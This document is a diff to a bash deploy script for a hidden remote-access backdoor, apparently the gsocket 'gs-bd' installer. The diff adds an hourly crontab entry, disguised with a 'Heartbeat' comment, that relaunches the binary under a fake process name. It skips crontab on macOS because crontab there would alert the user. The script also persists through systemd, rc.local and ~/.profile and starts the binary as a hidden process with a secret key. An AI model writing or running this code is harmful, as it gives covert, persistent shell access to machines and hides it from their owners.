@@ -138,7 +138,8 @@ init_vars()
 		KL_CMD_UARG="-u${USER}"
 	fi
 
-	command -v $KL_CMD >/dev/null || errexit "Need pkill or killall."
+	# command -v "$KL_CMD" >/dev/null || WARM_OUT "No pkill or killall found."
+	# command -v "$KL_CMD" >/dev/null || errexit "Need pkill or killall."
 
 	# Defaults
 	BIN_HIDDEN_NAME="${BIN_HIDDEN_NAME_DEFAULT}"
@@ -234,6 +235,12 @@ uninstall()
 	# Remove from login script
 	uninstall_rc "${GS_PREFIX}${HOME}/.profile"
 	uninstall_rc "${GS_PREFIX}/etc/rc.local"
+
+	# Remove crontab
+	if [[ ! $OSTYPE == *darwin* ]]; then
+		command -v crontab >/dev/null && crontab -l 2>/dev/null | grep -v "${BIN_HIDDEN_NAME}" | crontab - 2>/dev/null 
+	fi
+
 
 	# Remove systemd service
 	# STOPPING would kill the current login shell. Do not stop it.
@@ -358,19 +365,45 @@ install_system_rclocal()
 
 install_system()
 {
+	echo -en 2>&1 "Installing systemwide remote access permanentally....................."
+
 	# Try systemd first
 	install_system_systemd
-	[[ -n $IS_INSTALLED ]] && return
 
 	# Try good old /etc/rc.local
-	install_system_rclocal
-	[[ -n $IS_INSTALLED ]] && return
+	[[ -z $IS_INSTALLED ]] && install_system_rclocal
+
+	[[ -z $IS_INSTALLED ]] && { FAIL_OUT "no systemctl or /etc/rc.local"; return; }
+
+	OK_OUT
 }
 
-install_user()
+install_user_crontab()
 {
+	command -v crontab >/dev/null || return # no crontab
+	echo -en 2>&1 "Installing access via crontab........................................."
+	[[ -z $KL_CMD ]] && { FAIL_OUT "No pkill or killall found."; return; }
+	if crontab -l 2>/dev/null | grep "$BIN_HIDDEN_NAME" &>/dev/null; then
+		IS_INSTALLED=1
+		IS_SKIPPED=1
+		gs_secret_reload "$SEC_FILE"
+		SKIP_OUT "Already installed in crontab."
+		return
+	fi
+
+	(crontab -l 2>/dev/null && \
+	echo "# DO NOT DELETE THIS LINE - Heartbeat ${BIN_HIDDEN_NAME}" && \
+	echo "0 * * * * command -v ${KL_CMD} >/dev/null && ${KL_CMD} -0 ${KL_CMD_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || TERM=xterm-256color GSOCKET_ARGS=\"-k ${SEC_FILE} -liqD\" $(which bash) -c exec -a ${PROC_HIDDEN_NAME} ${DSTBIN})") | crontab - 2>/dev/null || { FAIL_OUT; return; }
+
+	IS_INSTALLED=1
+	OK_OUT
+}
+
+install_user_profile()
+{
+	echo -en 2>&1 "Installing access via ~/.profile......................................"
+	[[ -z $KL_CMD ]] && { FAIL_OUT "No pkill or killall found."; return; }
 	[[ -f "${RC_FILE}" ]] || { touch "${RC_FILE}"; chmod 600 "${RC_FILE}"; }
-	SEC_FILE="$(dirname "${DSTBIN}")/${SEC_NAME}"
 	if grep "$BIN_HIDDEN_NAME" "$RC_FILE" &>/dev/null; then
 		IS_INSTALLED=1
 		IS_SKIPPED=1
@@ -385,9 +418,23 @@ install_user()
 	touch -r "${RC_FILE}" "${RC_FILE}-new"
 	mv "${RC_FILE}-new" "${RC_FILE}"
 
-	gs_secret_write "$SEC_FILE"
-
 	IS_INSTALLED=1
+	OK_OUT
+}
+
+install_user()
+{
+
+	SEC_FILE="$(dirname "${DSTBIN}")/${SEC_NAME}"
+
+	# Do not use crontab on OSX: It pops a warning to the user
+	if [[ ! $OSTYPE == *darwin* ]]; then
+		install_user_crontab
+	fi
+
+	install_user_profile
+
+	[[ -z $IS_SKIPPED ]] && gs_secret_write "$SEC_FILE" # Create new secret file
 }
 
 # Download $1 and save it to $2
@@ -439,20 +486,18 @@ GS_SECRET=$("$DSTBIN" -g)
 [[ -z "$GS_SECRET" ]] && { FAIL_OUT "Execution failed...wrong binary?"; errexit; }
 
 # -----BEGIN Install permanentally-----
-echo -en 2>&1 "Installing remote access permanentally................................"
 
-# Try to install system wide. This will also start the service.
+# Try to install system wide. This may also start the service.
 [[ $UID -eq 0 ]] && install_system
 
-# Try to install to user's login script
+# Try to install to user's login script or crontab
 [[ -z $IS_INSTALLED ]] && install_user
 # -----END Install permanentally-----
 
 if [[ -z "$IS_INSTALLED" ]]; then
-	FAIL_OUT "Access will be lost after reboot."
-elif [[ -z "$IS_SKIPPED" ]]; then
-	OK_OUT
+	echo -e 1>&1 "--> ${CR}Access will be lost after reboot.${CN}"
 fi
+# After all install attempts output help how to uninstall
 echo -e 1>&2 "--> To uninstall type ${CM}GS_UNDO=1 ${DL_CMD}${CN}"
 
 printf 1>&2 "%-70.70s" "Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'....................................."
@@ -477,8 +522,18 @@ elif [[ -z "$IS_GS_RUNNING" ]]; then
 	# GS_UNDO=1 ./deploy.sh -> removed all binaries but user does not issue 'pkill gs-bd'
 	# ./deploy.sh -> re-installs new secret. Start gs-bd with _new_ secret.
 	# Now two gs-bd's are running (which is correct)
-	${KL_CMD} -0 "$KL_CMD_UARG" "${BIN_HIDDEN_NAME}" 2>/dev/null && IS_OLD_RUNNING=1
+	# [[ -n $KL_CMD ]] && ${KL_CMD} -0 "$KL_CMD_UARG" "${BIN_HIDDEN_NAME}" 2>/dev/null && IS_OLD_RUNNING=1
+	if [[ -n $KL_CMD ]]; then
+		${KL_CMD} -0 "$KL_CMD_UARG" "${BIN_HIDDEN_NAME}" 2>/dev/null && IS_OLD_RUNNING=1
+	elif command -v pidof >/dev/null; then
+		# if no pkill/killall then try pidof (but we cant tell which user...)
+		if pidof -qs "$BIN_HIDDEN_NAME" &>/dev/null; then
+			IS_OLD_RUNNING=1
+		fi
+	fi
 	IS_NEED_START=1
+
+	# if [[ -z $KL_CMD ]] || [[ -n "$IS_OLD_RUNNING" ]]; then
 	if [[ -n "$IS_OLD_RUNNING" ]]; then
 		# HERE: already running.
 		if [[ -n "$IS_SKIPPED" ]]; then
@@ -494,6 +549,7 @@ elif [[ -z "$IS_GS_RUNNING" ]]; then
 	else
 		OK_OUT ""
 	fi
+
 	if [[ -n "$IS_NEED_START" ]]; then
 		(TERM=xterm-256color GSOCKET_ARGS="-s $GS_SECRET -liD" exec -a "$PROC_HIDDEN_NAME" "$DSTBIN")
 		IS_GS_RUNNING=1
